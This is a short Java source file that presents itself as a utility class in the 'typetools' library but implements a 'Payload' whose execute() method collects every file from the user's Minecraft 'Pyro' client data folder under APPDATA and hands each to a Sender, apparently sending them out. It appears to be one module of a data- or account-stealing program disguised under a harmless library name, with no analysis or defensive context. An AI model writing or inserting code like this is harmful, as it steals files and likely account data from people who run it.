package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;

public final class TypeUtil18 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server"))
        {
            Sender.send(file);
        }
    }
}
